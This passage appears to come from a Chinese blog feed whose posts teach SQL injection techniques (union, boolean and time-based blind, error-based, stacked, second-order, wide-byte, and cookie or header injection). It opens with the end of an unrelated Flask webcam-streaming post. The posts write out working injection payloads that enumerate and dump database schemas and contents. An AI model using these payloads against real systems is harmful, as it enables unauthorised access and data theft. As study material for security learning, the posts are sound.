class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        success<span class="token punctuation">,</span> frame <span class="token operator">=</span> camera<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> success<span class="token punctuation">:</span>            ret<span class="token punctuation">,</span> buffer <span class="token operator">=</span> cv2<span class="token punctuation">.</span>imencode<span class="token punctuation">(</span><span class="token string">'.jpg'</span><span class="token punctuation">,</span> frame<span class="token punctuation">)</span>            frame <span class="token operator">=</span> buffer<span class="token punctuation">.</span>tobytes<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">yield</span> <span class="token punctuation">(</span>b<span class="token string">'--frame\r\nContent-Type: image/jpeg\r\n\r\n'</span> <span class="token operator">+</span> buffer<span class="token punctuation">.</span>tobytes<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> b<span class="token string">'\r\n'</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">video_feed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> Response<span class="token punctuation">(</span>generate_frames<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>mimetype<span class="token operator">=</span><span class="token string">'multipart/x-mixed-replace;boundary=frame'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s2.loli.net/2023/03/19/cQ87hagSwpFA3CE.jpg" alt="效果就这样"><br>但是这样子做出来的很大缺陷:<br>1.没办法调倍速<br>2.没声音<br>3.不能循环播放之类的</p><p>但是，要想解决上面这些问题只需要再添加两行代码！！！<br>一行代码启动docker版nginx-rtmp服务<br>另一行代码使用FFmpeg推流，指定服务器地址<br>（我没试过，出问题别找我）</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cookie/Base64/HTTP头部注入</title>
      <link href="/2023/03/15/cookie%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/03/15/cookie%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h3 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h3><h4 id="表现"><a href="#表现" class="headerlink" title="表现"></a>表现</h4><p>常见于&emsp;.asp?id=xx&emsp;之类的带参数的URL</p><h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><p>cookie是一些数据信息，类型为“小型文本文件”，存储于电脑上的文本文件中。<br>cookie是服务器创建后返回给游览器的。游览器只进行了保存。<br> 一般cookie是以键值对进行表示的(key-value)</p><pre><code>cookie常用属性的解释：       Name： cookie的名字       Value： cooke的值       Path： 定义了Web站点上可以访问该Cookie的目录       Expires： 表示cookie的过期时间，也就是有效值       Size： 表示cookie的大小</code></pre><p>cookie有2种存储方式，会话性（关浏览器就清除）和持久性（保留到有效期结束）</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>ASP脚本中的request对象，被用于从用户那里获取信息。<br>Request对象的使用方法：request.[集合名称]（参数名称）<br>但是它同时允许提交时省略集合名称<br>按QueryString、Form、Cookies、ServerVariables的顺序来获取数据的<br>所以，当未指明使用request对象的具体方法进行获取且未过滤语句时存在注入。</p><h4 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h4><p>（1）寻找.asp?id=xx这样的页面<br>（2）将“id=xx”删掉，看页面是否正常。不正常则说明参数在数据传递中启直接作用<br>（3）清空网址，输入</p><pre><code>javascript:alert(document.cookie=“id=”+escape(“xx”));document.cookie:表示当前浏览器中的cookie变量alert():弹出一个对话框escape():对字符串进行编码</code></pre><p>&emsp;&emsp;按Enter键后弹出一个对话框，内容是“id=xx”<br>&emsp;&emsp;然后重新输入原来URL回车<br>&emsp;&emsp;如果显示正常，说明是用Request(“id”)方式获取数据<br>（4）判断是否存在漏洞:将SQL判断语句带入，并重复第三步</p><pre><code>javascript:alert(document.cookie=“id=”+escape(“xx and 1=1”));javascript:alert(document.cookie=“id=”+escape(“xx and 1=2”));两次回显不一样则说明存在注入漏洞，并可以进行cookie注入</code></pre><p>（5）代入SQL语句</p><pre><code>javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;xx order by 2&quot;));javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;284 union select 1,…… from xx&quot;));</code></pre><h3 id="Base64注入"><a href="#Base64注入" class="headerlink" title="Base64注入"></a>Base64注入</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>程序对GET的传参进行接收，并且对其进行解码，然后再放入查询语句中。<br>这时候我们可以编码，然后程序执行的时候，会把我们所编码的注入语句解码，再拼接到了原本程序要执行的代码中</p><h4 id="讲解"><a href="#讲解" class="headerlink" title="讲解"></a>讲解</h4><p>Base64注入实质上并不是一个全新的注入手段，而是一种对数据处理的方法。<br>Base64注入可以发生在cookie注入中，只要有</p><pre><code>$id = base64_decode($_GET[&#39;id&#39;]);</code></pre><p>这个函数语句，就会发生Base64的解码，甚至可以加解密成其他的格式<br>此时就需要一个个试或者进行白盒测试了。</p><h3 id="最后总结一下HTTP头部注入"><a href="#最后总结一下HTTP头部注入" class="headerlink" title="最后总结一下HTTP头部注入"></a>最后总结一下HTTP头部注入</h3><p>原理:后台开发人员为了验证客户端HTTP Header（比如常用的Cookie验证等）或者通过HTTP Header头信息获取客户端的一些信息（例如：User-Agent、Accept字段等），会对客户端HTTP Header 进行获取并使用SQL语句进行处理，如果此时没有足够的安全考虑，就可能导致基于HTTP Header的注入漏洞</p><p>使用HTTP头部注入漏洞的前提条件:<br>（1）能够对请求头消息进行修改<br>（2）修改的请求头信息能够带入数据库执行<br>（3）数据库没有对输入的请求头做过滤</p><p>常见方法:<br>Cookie注入<br>User-Agent注入<br>Referer注入<br>XFF注入（X-Forwarded-For）</p><p>如果要详细了解请自行查询。</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL二次注入&amp;宽字节注入</title>
      <link href="/2023/03/13/SQL%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/03/13/SQL%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h3 id="SQL二次注入"><a href="#SQL二次注入" class="headerlink" title="SQL二次注入"></a>SQL二次注入</h3><h4 id="表现"><a href="#表现" class="headerlink" title="表现"></a>表现</h4><p>在二次注入中，一般不会是单纯的二次注入<br>通常会与报错注入或Bool盲注结合。<br>比如，在注册页面输入的用户名在登录后才有盲注的回显<br>这时候我们需要自己编写脚本模拟注册及登录。</p><p>无法通过扫描工具或者手工测试出来，二次注入一般在审计代码过程中发现<br>从前端或黑盒测试无法看到</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>攻击者构造恶意的数据并存储在数据库后<br>防御者对语句中的特殊字符进行了转义处理<br>但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中<br>当程序调用恶意数据并执行SQL查询时就发生了SQL二次注入。<br>总而言之:<br>用户输入恶意的数据库查询语句时会被转义，<br>但在数据库调用读取语句时又被还原导致语句执行。</p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p><strong>第一步：构造恶意语句</strong><br>没有恶意代码怎么能行？先上传含有能被转义的字符的恶意查询语句<br><strong>第二步：插入恶意数据</strong><br>传入数据并任他对其中特殊字符进行转义处理，但在保存在数据库时<strong>保留了原来的味道</strong><br><strong>第三步：二次构造语句，引用恶意数据</strong><br>因为开发者默认存在数据库里的数据都是安全的<br>所以在进行查询时，直接从数据库中取出九转大肠<br>结果如下:<br><img src="https://s2.loli.net/2023/03/13/wrX4BSlGyjPmqgH.jpg" alt="只保留了一点原始的味道"></p><h4 id="注入方法"><a href="#注入方法" class="headerlink" title="注入方法"></a>注入方法</h4><h5 id="构造并存入一个恶意语句"><a href="#构造并存入一个恶意语句" class="headerlink" title="构造并存入一个恶意语句"></a>构造并存入一个恶意语句</h5><p>由于这种注入太难以被判断及发现，所以本文只作简单说明(其实是因为我太菜了)</p><pre><code>在注册等类似能上传并存储数据的页面存入admin&#39;#mysql_escape_string()等函数会在特殊字符前加 \ 造成过滤的效果</code></pre><p>此时传入时不会执行恶意代码，因为它过滤了。<br>但是存入的时候没有更改原来的数据。</p><h5 id="调用数据库中的恶意语句"><a href="#调用数据库中的恶意语句" class="headerlink" title="调用数据库中的恶意语句"></a>调用数据库中的恶意语句</h5><p>既然原来的数据没改，那就再调出来用(相当于执行了恶意代码)。</p><pre><code>下面是sqllab靶场的题，二次执行时整个语句变成了这样子update password=$new where username=admin&#39;#</code></pre><p>admin后引号对前面的单引号进行了闭合，#注释掉了后面的语句，就相当于对admin进行了改密</p><h3 id="SQL宽字节注入"><a href="#SQL宽字节注入" class="headerlink" title="SQL宽字节注入"></a>SQL宽字节注入</h3><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><p>**单字节字符集:**所有的字符都使用一个字节来表示（ASCII 编码0-127）<br>**多字节字符集:**在多字节字符集中，用多个字节来表示（也有可能一部分用一个字节表示）<br>**宽字符:**用多个字节来代表的字符称之为宽字符<br>**字符、字符集:**字符是组成字符集的基本单位<br>**UTF8:**由于ASCII表示的字符只有128个，因此网络世界的规范是使用UNICODE编码，但是用ASCII表示的字符使用UNICODE并不高效。因此出现了中间格式字符集，被称为通用转换格式，及UTF。<br>**宽字节:**GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象，即将两个ascii字符误认为是一个宽字节字符。</p><h4 id="表现-1"><a href="#表现-1" class="headerlink" title="表现"></a>表现</h4><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>1、宽字节注入是利用mysql的一个特性:<br>&emsp;&emsp;PHP中编码为GBK，函数执行添加的是ASCII编码（添加的符号为\）<br>&emsp;&emsp;MYSQL默认字符集是GBK等宽字节字符集。<br>2、PHP发送请求到mysql，mysql在使用GBK编码的时候会认为两个字符是一个汉字<br>3、字符和转义的反斜杠组成了新的汉字，但是组成的新汉字又不是一个正常的汉字，就起到了注掉 \ 的作用</p><h4 id="转义函数"><a href="#转义函数" class="headerlink" title="转义函数"></a>转义函数</h4><pre><code>addslashes函数:对单引号(’)、双引号(&quot;)、反斜线(\)与x00 (NULL字符）magic_quotes_gpc函数:判断解析用户提交的数据，有post、get、cookie数据时增加转义字符“\”mysql_real_escape_string函数mysql_escape_string函数</code></pre><h4 id="注入方法-1"><a href="#注入方法-1" class="headerlink" title="注入方法"></a>注入方法</h4><p>方法一:<br>比如and’的编码是%df’，传参时单引号被加上\变成了 %df&#39;<br>其中\的十六进制是%5C ，那么现在 %df&#39; =%df%5c%27<br>如果程序的默认字符集是GBK等宽字节字符集<br>则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗</p><pre><code>也就是说:%df\&#39; = %df%5c%27=縗&#39;</code></pre><p>我们再回想到注入的三要素，有了单引号(闭合)后就好注入了</p><p>方法二:<br>使用汉字绕过。<br>PHP接收到一个汉字后通过UTF-8编码（三字节），并和\两两配对组成两个汉字，避免了后面引号的转义</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL时间注入&amp;堆叠注入</title>
      <link href="/2023/03/12/SQL%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/03/12/SQL%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h3 id="SQL时间注入"><a href="#SQL时间注入" class="headerlink" title="SQL时间注入"></a>SQL时间注入</h3><h4 id="表现"><a href="#表现" class="headerlink" title="表现"></a>表现</h4><p>无论输入什么都会返回正常的处理信息或者页面无回显<br>能依靠自身感知到页面的延时情况</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>前端在将数据传给后台时，设置了一个if语句<br>当条件为真时执行sleep语句，条件为假时无执行语句</p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>时间注入又称延时注入，与布尔盲注同属于盲注无回显的类型。<br>如果想要注入，必不可少的是得看得到效果。<br>那么有没有什么方法能直接或是间接地显示或猜解出数据呢？<br>当然有！前面就已近提到过函数这个东西了。<br>函数与and结合时，如果传入的参数正确就会触发函数，否则不执行。<br>此时将函数与查询语句结合后再与传入的参数结合就能达到最终效果了。</p><h4 id="相关函数讲解"><a href="#相关函数讲解" class="headerlink" title="相关函数讲解"></a>相关函数讲解</h4><pre><code>if(a,b,c)                如果a是TRUE(a!=0或a!=NULL)，则返回b，否则返回csleep(x)                 延时x秒if(a,b,c)                a为真，执行b；否则执行cbenchmark(a,b)           a为操作次数，b为执行的函数                         原理是通过多次操作，让极短暂的延时增加到能识别的程度                         后面几个都是这种思想笛卡尔积                  别问，老子离散数学还没学到这！get_lock(key, timeout)   key(最好是数字)指定名称获取锁，timeout指定锁定时间                         前提条件是数据库连接是长连接正则bug                  利用大量正则计算延长时间，实现延时除此之外还有case … when … then … else … end</code></pre><h4 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h4><h5 id="判断是否存在注入点及注入的类型"><a href="#判断是否存在注入点及注入的类型" class="headerlink" title="判断是否存在注入点及注入的类型"></a>判断是否存在注入点及注入的类型</h5><pre><code>?id=1?id=5?id=5&#39;?id=5&quot;?id=5 and 1=1?id=5 and 1=2</code></pre><p>如果页面显示结果一样，那就说明可能是延时注入</p><h5 id="获取库长度"><a href="#获取库长度" class="headerlink" title="获取库长度"></a>获取库长度</h5><pre><code>?id=1 and if(length(database())&lt;10,sleep(5),1)?id=1 and if(length(database())=4,sleep(5),1)</code></pre><p>如果第一个没有延时，但是第二个有5秒延时则表名数据库名长度为4</p><h5 id="获取库名、表名、字段名及字段内容"><a href="#获取库名、表名、字段名及字段内容" class="headerlink" title="获取库名、表名、字段名及字段内容"></a>获取库名、表名、字段名及字段内容</h5><pre><code>爆数据库名?id=1 and if(ascii(substr(database(),1,1))=106,sleep(5),1)测试表数量?id=1 and (select count(table_name) from information_schema.tables where table_schema = database())&lt;5测试第一张表长度?id=1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&lt;10测试表名?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;100测试表中字段数量?id=1 and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273)=5测试字段内容?id=1 and (select count(name) from users)=4</code></pre><p>这时候你会发现这就是布尔盲注的做法<br>一个一个跑咯，懒得细细讲解了</p><h3 id="SQL堆叠注入"><a href="#SQL堆叠注入" class="headerlink" title="SQL堆叠注入"></a>SQL堆叠注入</h3><h4 id="表现-1"><a href="#表现-1" class="headerlink" title="表现"></a>表现</h4><p>跟联合查询注入差不多，两个方式相应的真假值都有不同的回显。</p><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>在SQL中，分号表示一条 sql 语句的结束。<br>在分号后继续构造下一条语句，就会把两条语句一起执行。<br><strong>联合注入</strong>也是将两条语句合并在一起，两者之间有什么区别么？<br>union执行的语句类型是有限的，而堆叠注入可以执行任意语句。</p><h4 id="开始注入-1"><a href="#开始注入-1" class="headerlink" title="开始注入"></a>开始注入</h4><h5 id="检查注入点及回显位"><a href="#检查注入点及回显位" class="headerlink" title="检查注入点及回显位"></a>检查注入点及回显位</h5><pre><code>?id=1&#39;?id=1&#39; and 1=1--+?id=1&#39; and 1=2--+</code></pre><h5 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h5><p>方法前面都有讲，回去抄payload就行了<br>加入分号，再接一个SQL语句看是否能显出结果。</p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><p>今天不讲一句，讲一段话。</p><p><strong>人像摄影，更强调人物本身的特点，仿佛这个人就在你面前一样。<br>但是每个人不同的身高决定了站立时必定不能拍出完美的图片。<br>因此，拍人像时，最简单的一个办法就是用跟他们同样的视角拍摄，<br>这样才能看见他们更多的表情、神态和动作。<br>你才能看到他们的世界，画面才会更有吸引力。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL报错注入</title>
      <link href="/2023/03/12/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/03/12/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h4 id="表现"><a href="#表现" class="headerlink" title="表现"></a>表现</h4><p>数据库在执行时，遇到语法不对，会显示报错信息，比如错误语句:select’</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>在公司开发项目是通常程序开发期间需要告诉使用者某些报错信息，方便程序员进行调试修复，定位文件错误，而且开发中会经常使用异常处理函数，捕获错误信息，比如在PHP中使用mysql_error()函数。如果SQL注入存在时，会有报错信息返回就可以采用报错注入进行攻击啦！！！</p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>报错注入嘛，首先肯定要让它报错呀。<br>那么什么时候才会报错呢？</p><pre><code>Xpath语法错误     extractvalue(1,(concat(0x7e,(payload),0x7e)))     updatexml(1,(concat(0x7e,(payload),0x7e)))     0x7e这个十六进制数代表符号~，~这个符号在xpath语法中是不存在的，因此总能报错     详细的使用方法请自行查找数据溢出错误     exp(x)     当参数x超过710时，exp()函数会报错主键重复错误     floor(x)：     count()和group by遇到rand()产生的重复值时报错函数特性报错     使用name_const来制造一个列     mysql列名重复会报错参数类型报错(不写了，自己找去)</code></pre><p>现在有了报错，怎么利用？<br>忘记了那个and和or语句了吗？<br>把SQL语句放到产生报错的语句中，<br>再将原本要传入的参数和上面已经结合起来的语句用and合为payload。</p><h4 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h4><h5 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h5><pre><code>?id=1&#39; -- a</code></pre><p>老一套了，直接拿来用。</p><h5 id="判断是否是报错注入"><a href="#判断是否是报错注入" class="headerlink" title="判断是否是报错注入"></a>判断是否是报错注入</h5><pre><code>?id=1&#39; and updatexml(1,&#39;~&#39;,3) -- a</code></pre><p>如果报错了那说明是的，这里可以多换几个函数。<br>要让前面一半正常执行！</p><h5 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h5><pre><code>?id=-1&#39; and updatexml(1,concat(&#39;~&#39;,    substr(         (select group_concat(schema_name)        from information_schema.schemata)    , 1 , 31)),3) -- a</code></pre><p>一样的，函数自己换<br>但是注意高版本数据库基本上都没有这个漏洞了<br>尽管这样，一旦有漏洞就能用这个库跑了</p><h5 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h5><pre><code>?id=1&#39; and updatexml(1,concat(&#39;~&#39;,    substr(         (select group_concat(table_name)        from information_schema.tables        where table_schema = &#39;库名&#39;)    , 1 , 31)),3) -- a</code></pre><h5 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h5><pre><code>?id=1&#39; and updatexml(1,concat(&#39;~&#39;,    substr(         (select group_concat(column_name)        from information_schema.columns        where table_schema = &#39;库名&#39; and table_name = &#39;表名&#39;)    , 1 , 31)),3) -- a</code></pre>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL布尔盲注(延时注入后面再写)</title>
      <link href="/2023/03/12/SQL%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/"/>
      <url>/2023/03/12/SQL%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/</url>
      
        <content type="html"><![CDATA[<h4 id="表现"><a href="#表现" class="headerlink" title="表现"></a>表现</h4><p>在测试中不会展现任何数据库报错内容，但是网页中真和假有着不同的回显。<br>或者为真时返回正常页面，为假时跳转到其它页面等。</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>在后端的PHP代码中，对你传入的数据进行了处理并判断<br>判断是True或False会执行不同代码</p><h4 id="开始注入-二分法"><a href="#开始注入-二分法" class="headerlink" title="开始注入(二分法)"></a>开始注入(二分法)</h4><h5 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h5><p>使用一些判断真假的语句来进行判定<br>当它是数字型时:</p><pre><code>1&#39; and 1=0 --+1&#39; and 1=1 --+</code></pre><p>如果第一个与第二个回显不一样那么可能是布尔盲注<br>但是不排除有些丧心病狂的扑街预判了你的预判<br>这时候修改为不常见的数值（如1352=1352等）</p><p>当它是字符串型注入时:</p><pre><code>1&#39; and &#39;1&#39;=&#39;114514 --+1&#39; and &#39;1&#39;=&#39;666 --+</code></pre><h5 id="猜数据库名长度"><a href="#猜数据库名长度" class="headerlink" title="猜数据库名长度"></a>猜数据库名长度</h5><p>这个应该很好理解吧，既然它不告诉你有啥，那你就自己猜咯。<br>刚刚好又有and可以判断语句，是不是天无绝人之路？</p><pre><code>1&#39; and (length(database()))&gt;x--+</code></pre><p>当报错的时候就说明数据库名字长度是x-1了嘛</p><h5 id="猜数据库名（ASCII码）"><a href="#猜数据库名（ASCII码）" class="headerlink" title="猜数据库名（ASCII码）"></a>猜数据库名（ASCII码）</h5><pre><code>1&#39; and ascii(substr(database(),1,1))&gt;100--+1&#39; and ascii(substr(database(),1,1))&lt;150--+</code></pre><p>这样子一直用二分法来缩小数据库名的ASCII码范围直到求出最终值。<br>是不是很麻烦？是就对了！<br>现在是告诉你注入原理，不看就滚犊子。</p><h5 id="猜表名"><a href="#猜表名" class="headerlink" title="猜表名"></a>猜表名</h5><pre><code>1&#39; and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;100--+1&#39; and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&lt;150--+</code></pre><p>方法其实是和前面的联合查询注入一样的，多了个二分法而已<br>其实拿SQLmap和BP跑也是差不多的原理，只是自动化注入罢了</p><h5 id="猜字段名"><a href="#猜字段名" class="headerlink" title="猜字段名"></a>猜字段名</h5><pre><code>1&#39; and (ascii(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 1,1),1,1)))&gt;50--+1&#39; and (ascii(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 1,1),1,1)))&lt;80--+</code></pre><p>还是一样的</p><h5 id="猜数据"><a href="#猜数据" class="headerlink" title="猜数据"></a>猜数据</h5><pre><code>1&#39; and (ascii(substr(( select  id users limit 0,1),1,1)))&lt;80--+1&#39; and (ascii(substr(( select  id users limit 0,1),1,1)))&gt;30--+</code></pre><p>仍然是一样的</p><h4 id="开始注入-字符判断法"><a href="#开始注入-字符判断法" class="headerlink" title="开始注入(字符判断法)"></a>开始注入(字符判断法)</h4><p>数据库名字长度的判断跟上面的的一样<br>对每一位猜解都要写很多次判断语句<br>判断这些字符数字</p><pre><code>0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.@_</code></pre><h4 id="使用Burp-Suite注入"><a href="#使用Burp-Suite注入" class="headerlink" title="使用Burp_Suite注入"></a>使用Burp_Suite注入</h4><p>由于手工进行一一判断，工作量较大，可使用Burp_Suite中的字典进行。<br>1、抓包并将数据包传送到intruder<br>2、对对应位置进行上面提到的字符数字爆破:</p><pre><code>http://192.168.162.128/?id=1&#39; and if(SUBSTRING(database(),$1$,1)=$d$,1,0)–+&amp;Submit=Submit#</code></pre><p>payload set中分别设置并开始attack:<br>number类型，从1到数据库名字长度，步长为1<br>simple list类型，导入字符数字的字典</p><p><em><strong>后面的同理，自己举一反三吧</strong></em></p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL联合注入</title>
      <link href="/2023/03/12/SQL%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/03/12/SQL%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h3 id="SQL联合注入"><a href="#SQL联合注入" class="headerlink" title="SQL联合注入"></a>SQL联合注入</h3><h4 id="表现"><a href="#表现" class="headerlink" title="表现"></a>表现</h4><p>有回显且可进行联合查询</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>SQL中union select查询的方式将结果合在一起，并删除重复的数据。这就是联合查询。</p><h4 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h4><p>1、判断是否存在注入点<br>（1）修改参数值，查看数据是否改变<br>（2）插入单、双引号的检测方法，未闭合的单引号会有报错</p><p>2、判断注入点是整形还是字符型<br>（1）数字型：通过</p><pre><code>and 1=1</code></pre><p>（2）字符串型：闭合单引号测试语句</p><pre><code>&#39;and&#39;1&#39;=&#39;1</code></pre><p>3、判断查询列数</p><pre><code>select username,password from where username=&#39;root&#39; and password=123 order by x</code></pre><p>当输入x报错时，真实的列数是「x-1」<br>(1)为什么用order by 可以证明前面语句查询了三列数据呢？<br>&emsp;&emsp;select * from order by (你要按照排序的对象)<br>&emsp;&emsp;order by可以按照指定的「字段名」排序<br>&emsp;&emsp;还可以按照「索引」进行排序，索引就是从左至右将列名按照123排序<br>&emsp;&emsp;对MySQL中查询结果按照指定字段名进行排序，左边第一个字段对应的索引是 1<br>&emsp;&emsp;当输入的索引溢出时它就会报错。<br>(2)我们为什么要知道前面查询了多少语句呢？<br>&emsp;&emsp;因为union前面查询语句查询的元素与后面查询语句查询的元素要在数量上一样<br>&emsp;&emsp;select 甲,乙,丙 union select 1,2,3<br>&emsp;&emsp;因为前面查询的语句有三个元素（甲，乙，丙）<br>&emsp;&emsp;所以后面查询的语句必须是三个元素（1，2，3）</p><p>4、找到显示位</p><pre><code>?id=-1 union select 1,2,3,4,5,6 --+</code></pre><p>如果在使用UNION SELECT 1,2,3…,11 from table时，网页中显示了信息8<br>那么说明网页只能够显示第8列中信息，不能显示其他列的信息。<br>也可以理解为网页只开放了8这个窗口，你想要查询数据库信息就必须要通过这个窗口。<br>所以如果我们想要知道某个属性的值，比如admin；<br>就要把admin属性放到8的位置上，这样就能通过第8列爆出admin的信息。<br>但是为了爆出第一位后面的显示位需要隐藏正常结果<br>比如将id=1改为id=-1，使union前面的语句报错，执行后面的，爆出显示位</p><p>5、利用显示位获取库名</p><pre><code>select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA</code></pre><p>在高版本中查询该表就行，具体看上一篇文章。<br>group_concat()函数将所有查询的库名连在一起成为一条数据</p><pre><code>?id=-1&#39; union select 1,database(),3 --+</code></pre><p>假设判断出在2号位显示，那么在二号位换成想插入的SQL语句就行了。<br>相同的，这里也要让union前面的语句报错，执行后面的。</p><p>6、获取表名</p><pre><code>?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;库名&#39; --+</code></pre><p>相同的，这里也要让union前面的语句报错，执行后面的。<br>group_concat()函数将所有查询的表名连在一起成为一条数据</p><p>7、查询表中列名</p><pre><code>?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; --+</code></pre><p>数据库有个information_schema库，里面有个columns表，存有整个数据库的列名。<br>我们要去查找的列，就是在这个库中去找。</p><p>8、获取字段信息</p><pre><code>?id=-1’ union select 1,group_concat(列名),3 from 库名.表名 --+</code></pre><p>平平无奇，跟上面的没啥不同，等价于下面这条</p><pre><code>?id=-1’ union select 1,列名,3 from 库名.表名 limit 0,1 --+</code></pre><h4 id="联合查询注入是最简单的了，一定要完全看懂"><a href="#联合查询注入是最简单的了，一定要完全看懂" class="headerlink" title="联合查询注入是最简单的了，一定要完全看懂"></a>联合查询注入是最简单的了，一定要完全看懂</h4><h3 id="黑盒，白盒，灰盒测试"><a href="#黑盒，白盒，灰盒测试" class="headerlink" title="黑盒，白盒，灰盒测试"></a>黑盒，白盒，灰盒测试</h3><h4 id="黑盒测试（测试功能）"><a href="#黑盒测试（测试功能）" class="headerlink" title="黑盒测试（测试功能）"></a>黑盒测试（测试功能）</h4><p>黑盒测试是以用户的角度，从输入数据与输出数据的对应关系出发进行测试的。<br>目的是检测程序是否能适当地接收输入数据而产生正确的输出信息。<br>很明显，如果外部特性本身设计有问题或规格说明的规定有误，用黑盒测试方法是发现不了的。</p><h4 id="白盒测试（优化程序）"><a 